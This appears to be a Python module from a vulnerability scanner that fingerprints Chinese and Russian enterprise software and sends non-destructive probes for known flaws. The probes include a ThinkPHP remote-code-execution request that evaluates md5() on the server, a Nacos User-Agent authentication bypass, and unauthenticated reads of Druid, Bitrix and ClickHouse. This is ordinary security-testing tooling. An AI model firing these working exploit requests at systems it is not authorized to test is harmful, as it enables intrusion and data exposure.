"""Regional technology-stack fingerprinting + unauth exposure/RCE probes.

English-centric tooling barely fingerprints the CN/RU enterprise stacks that carry
the highest-payout pre-auth bugs. This module (a) passively fingerprints a response
for those products, and (b) runs a handful of **deterministic, non-destructive**
active checks — a benign `md5()` echo for ThinkPHP RCE, the Nacos `User-Agent`
auth-bypass differential, the Shiro `rememberMe=deleteMe` tell, and unauth-exposure
reads for Druid / 1C-Bitrix / ClickHouse. Exploitation (gadget chains, shells) is
never sent — that is handed to Strix.

Sources: FreeBuf / Seebug / AnQuanKe (CN), Habr / Wiz (RU/ClickHouse). See
docs/RESEARCH_GAPS.md Theme 4.
"""

from __future__ import annotations

import hashlib
from collections.abc import Callable
from dataclasses import dataclass, field

from ..net.http import HttpClient

# Passive fingerprints over ONE response: (product, where, needle). `where` is
# "body", "cookie" (any Set-Cookie), or "header:<name>".
_SIGNATURES: list[tuple[str, str, str]] = [
    ("1C-Bitrix", "body", "/bitrix/js/"),
    ("1C-Bitrix", "body", "bitrix_sessid"),
    ("1C-Bitrix", "cookie", "bitrix_sm_"),
    ("ThinkPHP", "body", "thinkphp"),
    ("ThinkPHP", "header:x-powered-by", "thinkphp"),
    ("Apache Shiro", "cookie", "rememberme"),
    ("Nacos", "body", "nacos"),
    ("Alibaba Druid", "body", "druid stat index"),
    ("Weaver e-cology", "cookie", "ecology_jsessionid"),
    ("Seeyon OA", "body", "/seeyon/"),
    ("Yonyou NC", "body", "yonyou"),
    ("ClickHouse", "body", "clickhouse"),
    ("Shiro/Spring", "header:server", "shiro"),
]


@dataclass
class StackResult:
    url: str
    detected: list[str] = field(default_factory=list)
    findings: list[dict] = field(default_factory=list)
    error: str | None = None


def match_stack_signatures(*, body: str, headers: dict[str, str],
                           set_cookies: list[str]) -> list[str]:
    """Passive fingerprint: which regional products does this response indicate?"""

    low_body = (body or "").lower()
    low_hdr = {k.lower(): (v or "").lower() for k, v in headers.items()}
    cookies = " ".join(set_cookies).lower()
    found: list[str] = []
    for product, where, needle in _SIGNATURES:
        hit = False
        if where == "body":
            hit = needle in low_body
        elif where == "cookie":
            hit = needle in cookies
        elif where.startswith("header:"):
            hit = needle in low_hdr.get(where.split(":", 1)[1], "")
        if hit and product not in found:
            found.append(product)
    return found


async def _fetch(client, url, scope_check, **kw):
    return await client.fetch(url, timeout=12.0, follow_redirects=True,
                              scope_check=scope_check, **kw)


async def _probe_thinkphp(client, base, scope_check) -> dict | None:
    marker = "moonmcp"
    expected = hashlib.md5(marker.encode()).hexdigest()  # noqa: S324 - benign RCE proof, not crypto
    payload = ("/index.php?s=/index/\\think\\app/invokefunction"
               f"&function=call_user_func_array&vars[0]=md5&vars[1][]={marker}")
    r = await _fetch(client, base.rstrip("/") + payload, scope_check)
    if r.status is not None and expected in r.text(limit=20_000):
        return {"product": "ThinkPHP", "severity": "critical", "verdict": "confirmed",
                "issue": "ThinkPHP invokefunction RCE",
                "detail": f"benign md5('{marker}') evaluated server-side → {expected} (CVE-2018-20062)"}
    return None


async def _probe_nacos(client, base, scope_check) -> dict | None:
    path = "/nacos/v1/auth/users?pageNo=1&pageSize=1"
    normal = await _fetch(client, base.rstrip("/") + path, scope_check)
    bypass = await _fetch(client, base.rstrip("/") + path, scope_check,
                          headers={"User-Agent": "Nacos-Server"})
    if bypass.status == 200 and normal.status in (401, 403):
        body = bypass.text(limit=20_000)
        if "pageItems" in body or '"username"' in body:
            return {"product": "Nacos", "severity": "high", "verdict": "confirmed",
                    "issue": "Nacos auth bypass (User-Agent: Nacos-Server)",
                    "detail": "user list returned to the Nacos-Server UA but 401/403 without it "
                              "(CVE-2021-29441)"}
    return None


async def _probe_shiro(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/", scope_check,
                     headers={"Cookie": "rememberMe=1"})
    setc = " ".join(r.get_all("set-cookie")).lower()
    if "remembeme=deleteme" in setc or "rememberme=deleteme" in setc:
        return {"product": "Apache Shiro", "severity": "medium", "verdict": "fingerprint",
                "issue": "Apache Shiro rememberMe present",
                "detail": "response set rememberMe=deleteMe → Shiro; test the default-key "
                          "deserialization (Shiro-550, CVE-2016-4437) with Strix"}
    return None


async def _probe_druid(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/druid/index.html", scope_check)
    body = r.text(limit=20_000).lower() if r.status == 200 else ""
    if "druid stat index" in body or "druid-min.js" in body:
        return {"product": "Alibaba Druid", "severity": "medium", "verdict": "confirmed",
                "issue": "Druid monitor exposed unauthenticated",
                "detail": "/druid/index.html reachable — /druid/websession.json can leak live "
                          "sessions"}
    return None


async def _probe_bitrix(client, base, scope_check) -> dict | None:
    r = await _fetch(client, base.rstrip("/") + "/bitrix/admin/index.php", scope_check)
    body = r.text(limit=20_000).lower() if r.status == 200 else ""
    if r.status == 200 and ("bitrix" in body or "авторизац" in body):
        return {"product": "1C-Bitrix", "severity": "low", "verdict": "exposed",
                "issue": "Bitrix admin panel reachable",
                "detail": "/bitrix/admin/ returned 200 — enumerate module CVEs (e.g. "
                          "vote-module CVE-2022-27228) via Strix"}
    return None


async def _probe_clickhouse(client, base, scope_check) -> dict | None:
    # Only meaningful when the target points at the ClickHouse HTTP port (8123).
    r = await _fetch(client, base.rstrip("/") + "/?query=SELECT%201", scope_check)
    if r.status == 200 and r.text(limit=200).strip() == "1":
        return {"product": "ClickHouse", "severity": "critical", "verdict": "confirmed",
                "issue": "unauthenticated ClickHouse HTTP interface",
                "detail": "SELECT 1 executed with no auth — full DB read via /play (cf. the Wiz "
                          "DeepSeek leak)"}
    return None


_ACTIVE_PROBES = (_probe_thinkphp, _probe_nacos, _probe_shiro, _probe_druid,
                  _probe_bitrix, _probe_clickhouse)


async def probe_stack(client: HttpClient, base_url: str, *,
                      scope_check: Callable[[str], bool] | None = None) -> StackResult:
    """Fingerprint the base page, then run the deterministic unauth stack probes."""

    result = StackResult(url=base_url)
    home = await _fetch(client, base_url, scope_check)
    if home.status is not None:
        result.detected = match_stack_signatures(
            body=home.text(limit=100_000), headers=home.headers_map(),
            set_cookies=home.get_all("set-cookie"))
    for probe in _ACTIVE_PROBES:
        try:
            hit = await probe(client, base_url, scope_check)
        except Exception:  # one probe must never sink the sweep
            hit = None
        if hit is not None:
            result.findings.append(hit)
            if hit["product"] not in result.detected:
                result.detected.append(hit["product"])
    return result
